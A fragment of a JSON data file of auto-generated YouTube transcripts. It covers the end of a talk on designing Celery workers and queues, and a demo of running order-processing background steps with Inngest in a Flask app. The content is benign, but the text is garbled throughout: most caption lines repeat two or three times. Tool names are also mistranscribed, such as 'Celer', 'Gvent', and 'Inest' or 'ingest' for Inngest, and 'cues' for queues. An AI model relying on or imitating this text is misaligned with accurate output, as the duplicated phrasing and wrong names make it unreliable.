lazy imports\ntricks. First, you can use lazy imports in your tasks, so big libraries only get\nin your tasks, so big libraries only get\nin your tasks, so big libraries only get loaded when they're actually needed.\nloaded when they're actually needed.\nloaded when they're actually needed. Second, if you have very different types\nSecond, if you have very different types\nSecond, if you have very different types of tasks, you can give them their own\nof tasks, you can give them their own\nof tasks, you can give them their own leaner Python environments. And finally,\nleaner Python environments. And finally,\nleaner Python environments. And finally, you can turn off some of Celer's\nyou can turn off some of Celer's\nyou can turn off some of Celer's internal features that you might not\ninternal features that you might not\ninternal features that you might not need, like gossip and mingle to shave\nneed, like gossip and mingle to shave\nneed, like gossip and mingle to shave off even more memory. All right, let's\noff even more memory. All right, let's\noff even more memory. All right, let's bring it all home. A really solid Celery\nbring it all home. A really solid Celery\nbring it all home. A really solid Celery architecture comes down to this\narchitecture comes down to this\narchitecture comes down to this five-step plan. First, analyze your\nfive-step plan. First, analyze your\nfive-step plan. First, analyze your tasks. Are they CPUbound or IO bound?\ntasks. Are they CPUbound or IO bound?\ntasks. Are they CPUbound or IO bound? That decision affects everything else?\nThat decision affects everything else?\nThat decision affects everything else? Second, define different cues for\nSecond, define different cues for\nSecond, define different cues for different jobs. Third, design your\ndifferent jobs. Third, design your\ndifferent jobs. Third, design your workers. Are you going to use the\nworkers. Are you going to use the\nworkers. Are you going to use the default pre-fork model or something like\ndefault pre-fork model or something like\ndefault pre-fork model or something like Gvent for intense IO? Fourth, plan your\nGvent for intense IO? Fourth, plan your\nGvent for intense IO? Fourth, plan your concurrency based on that analysis. And\nconcurrency based on that analysis. And\nconcurrency based on that analysis. And finally, distribute those workers across\nfinally, distribute those workers across\nfinally, distribute those workers across multiple machines to scale out. If you\nmultiple machines to scale out. If you\nmultiple machines to scale out. If you follow these steps, you'll build a\nfollow these steps, you'll build a\nfollow these steps, you'll build a system that's both powerful and super\nsystem that's both powerful and super\nsystem that's both powerful and super efficient. So the next time you're about\nefficient. So the next time you're about\nefficient. So the next time you're about to write a function that might take a\nto write a function that might take a\nto write a function that might take a little while to run, I want you to stop\nlittle while to run, I want you to stop\nlittle while to run, I want you to stop and ask yourself this one question. What\nand ask yourself this one question. What\nand ask yourself this one question. What kind of work is this really doing? Is it\nkind of work is this really doing? Is it\nkind of work is this really doing? Is it thinking hard or is it just waiting\nthinking hard or is it just waiting\nthinking hard or is it just waiting around? Knowing that difference is the\naround? Knowing that difference is the\naround? Knowing that difference is the first most important step to building\nfirst most important step to building\nfirst most important step to building apps that are truly scalable and\napps that are truly scalable and\napps that are truly scalable and resilient."
  },
  {
    "id": 60491647,
    "timestamp": "2026-02-23T00:14:56.022Z",
    "title": "Forget Celery & Queues – This Tool Changed Everything | 2MinutesPy",
    "url": "https://www.youtube.com/watch?v=jHz_VSQMi0A",
    "text": "Hey guys, a while ago I mentioned that I\nHey guys, a while ago I mentioned that I am working on a project and that is\nam working on a project and that is\nam working on a project and that is basically an e-commerce website loaded\nbasically an e-commerce website loaded\nbasically an e-commerce website loaded with AI. While building it, I ran into a\nwith AI. While building it, I ran into a\nwith AI. While building it, I ran into a classic issue. In e-commerce, placing an\nclassic issue. In e-commerce, placing an\nclassic issue. In e-commerce, placing an order isn't just one action. It triggers\norder isn't just one action. It triggers\norder isn't just one action. It triggers multiple background tasks. Sending\nmultiple background tasks. Sending\nmultiple background tasks. Sending confirmation emails, verifying payments,\nconfirmation emails, verifying payments,\nconfirmation emails, verifying payments, generating invoices, and more. My first\ngenerating invoices, and more. My first\ngenerating invoices, and more. My first idea was to handle everything manually,\nidea was to handle everything manually,\nidea was to handle everything manually, but that meant building a separate job\nbut that meant building a separate job\nbut that meant building a separate job system, setting up infra, honestly a\nsystem, setting up infra, honestly a\nsystem, setting up infra, honestly a headache. After some research, I found\nheadache. After some research, I found\nheadache. After some research, I found Inest. It simplified my work, so I\nInest. It simplified my work, so I\nInest. It simplified my work, so I thought, why not share it in a video?\nthought, why not share it in a video?\nthought, why not share it in a video? So, here's the demo Flask app. At first\nSo, here's the demo Flask app. At first\nSo, here's the demo Flask app. At first glance, it looks like a normal Flask\nglance, it looks like a normal Flask\nglance, it looks like a normal Flask app, but I've integrated inest to handle\napp, but I've integrated inest to handle\napp, but I've integrated inest to handle background tasks. I start by creating an\nbackground tasks. I start by creating an\nbackground tasks. I start by creating an ingest client with an app ID. Since\ningest client with an app ID. Since\ningest client with an app ID. Since we're in development mode, I set is\nwe're in development mode, I set is\nwe're in development mode, I set is production to false. Next, I define\nproduction to false. Next, I define\nproduction to false. Next, I define three background tasks. They're just\nthree background tasks. They're just\nthree background tasks. They're just placeholders for now. The first function\nplaceholders for now. The first function\nplaceholders for now. The first function sends a confirmation email. The second\nsends a confirmation email. The second\nsends a confirmation email. The second verifies the payment, and the last one\nverifies the payment, and the last one\nverifies the payment, and the last one generates the invoice. Normally I would\ngenerates the invoice. Normally I would\ngenerates the invoice. Normally I would put these inside one main function\nput these inside one main function\nput these inside one main function called order processing. This function\ncalled order processing. This function\ncalled order processing. This function is linked to the order/placed event.\nis linked to the order/placed event.\nis linked to the order/placed event. That means as soon as this event is\nThat means as soon as this event is\nThat means as soon as this event is sent, the function kicks in\nsent, the function kicks in\nsent, the function kicks in automatically. Here we've used ingest\nautomatically. Here we've used ingest\nautomatically. Here we've used ingest steps. Each step runs independently and\nsteps. Each step runs independently and\nsteps. Each step runs independently and retries if it fails. So I don't have to\nretries if it fails. So I don't have to\nretries if it fails. So I don't have to write my own retry logic. Then I added a\nwrite my own retry logic. Then I added a\nwrite my own retry logic. Then I added a home route to render the landing page\nhome route to render the landing page\nhome route to render the landing page and an order route to handle orders.\nand an order route to handle orders.\nand an order route to handle orders. Whenever a user places an order, this\nWhenever a user places an order, this\nWhenever a user places an order, this route sends the order/placed event to\nroute sends the order/placed event to\nroute sends the order/placed event to ingest with the order data. That's what\ningest with the order data. That's what\ningest with the order data. That's what triggers the background tasks. Finally,\ntriggers the background tasks. Finally,\ntriggers the background tasks. Finally, I use ingest flask serve to run\nI use ingest flask serve to run\nI use ingest flask serve to run everything. I just pass the flask app\neverything. I just pass the flask app\neverything. I just pass the flask app instance, the ingest client and the\ninstance, the ingest client and the\ninstance, the ingest client and the function, and inest takes care of the\nfunction, and inest takes care of the\nfunction, and inest takes care of the rest. The coolest part, the user doesn't\nrest. The coolest part, the user doesn't\nrest. The coolest part, the user doesn't have to wait around. Everything happens\nhave to wait around. Everything happens\nhave to wait around. Everything happens in the background. Wait, let me show\nin the background. Wait, let me show\nin the background. Wait, let me show you. I ran the Flask app and here's the\nyou. I ran the Flask app and here's the\nyou. I ran the Flask app and here's the interface I got. We have a button here\ninterface I got. We have a button here\ninterface I got. We have a button here to place an order. Now, when I place an\nto place an order. Now, when I place an\nto place an order. Now, when I place an order, hold on. First, I need to start\norder, hold on. First, I need to start\norder, hold on. First, I need to start injest development server. For that,\ninjest development server. For that,\ninjest development server. For that, Node.js must already be installed on\nNode.js must already be installed on\nNode.js must already be installed on your system. Now, I need to run this\nyour system. Now, I need to run this\nyour system. Now, I need to run this command in the terminal. What this\ncommand in the terminal. What this\ncommand in the terminal. What this basically does is it downloads the\nbasically does is it downloads the\nbasically does is it downloads the latest version of the ingest CLI. Then,\nlatest version of the ingest CLI. Then,\nlatest version of the ingest CLI. Then, this URL here is our Flask apps inest\nthis URL here is our Flask apps inest\nthis URL here is our Flask apps inest endpoint and the no discovery flag makes\nendpoint and the no discovery flag makes\nendpoint and the no discovery flag makes sure inest doesn't automatically try to\nsure inest doesn't automatically try to\nsure inest doesn't automatically try to search our app. Once I run this command,\nsearch our app. Once I run this command,\nsearch our app. Once I run this command, it gives me multiple URLs and clicking\nit gives me multiple URLs and clicking\nit gives me multiple URLs and clicking on any of these starts the dev server.\non any of these starts the dev server.\non any of these starts the dev server. Here we can see our app. On the lefth\nHere we can see our app. On the lefth\nHere we can see our app. On the lefth hand side, you can access functions and\nhand side, you can access functions and\nhand side, you can access functions and apps. You can also see currently running\napps. You can also see currently running\napps. You can also see currently running functions as well as previously executed\nfunctions as well as previously executed\nfunctions as well as previously executed ones. In our case, we only have one\nones. In our case, we only have one\nones. In our case, we only have one function. And yes, we could invoke it\nfunction. And yes, we could invoke it\nfunction. And yes, we could invoke it directly from here by passing proper\ndirectly from here by passing proper\ndirectly from here by passing proper data. But what we actually want is\ndata. But what we actually want is\ndata. But what we actually want is whenever the order is placed, the\nwhenever the order is placed, the\nwhenever the order is placed, the function should automatically run. To\nfunction should automatically run. To\nfunction should automatically run. To make that happen, we've simply used a\nmake that happen, we've simply used a\nmake that happen, we've simply used a bit of JavaScript. So, as soon as the\nbit of JavaScript. So, as soon as the\nbit of JavaScript. So, as soon as the button is triggered, the ingest function\nbutton is triggered, the ingest function\nbutton is triggered, the ingest function starts running. See, these steps are now\nstarts running. See, these steps are now\nstarts running. See, these steps are now executing one by one. Each step is an\nexecuting one by one. Each step is an\nexecuting one by one. Each step is an independent task. and they keep running\nindependent task. and they keep running\nindependent task. and they keep running until everything is complete. Meanwhile,\nuntil everything is complete. Meanwhile,\nuntil everything is complete. Meanwhile, the user can close the tab or do other\nthe user can close the tab or do other\nthe user can close the tab or do other things. Let me show you one more thing.\nthings. Let me show you one more thing.\nthings. Let me show you one more thing. Just a second. I'll refresh the Flask\nJust a second. I'll refresh the Flask\nJust a second. I'll refresh the Flask app, open the inspect tool, and go to\napp, open the inspect tool, and go to\napp, open the inspect tool, and go to the network tab. Now, watch when I place\nthe network tab. Now, watch when I place\nthe network tab. Now, watch when I place an order. Notice how quickly the request\nan order. Notice how quickly the request\nan order. Notice how quickly the request finishes, but in the background, Ingest\nfinishes, but in the background, Ingest\nfinishes, but in the background, Ingest is still processing everything. This\nis still processing everything. This\nis still processing everything. This solved my problem really well. And\nsolved my problem really well. And\nsolved my problem really well. And honestly, Ingest can do a lot more to\nhonestly, Ingest can do a lot more to\nhonestly, Ingest can do a lot more to reduce production load. I'll drop the\nreduce production load. I'll drop the\nreduce production load. I'll drop the link in the description, so definitely\nlink in the description, so definitely\nlink in the description, so definitely check it out. Oh, and one more thing.\ncheck it out. Oh, and one more thing.\ncheck it out. Oh, and one more thing. Notice in this code section, I've used\nNotice in this code section, I've used\nNotice in this code section, I've used step.run, but there are other methods\nstep.run, but there are other methods\nstep.run, but there are other methods too, each for different types of tasks.\ntoo, each for different types of tasks.\ntoo, each for different types of tasks. So, yeah, that's it. Feel free to\nSo, yeah, that's it. Feel free to\nSo, yeah, that's it. Feel free to explore and I'll see you in the next"
  }
]
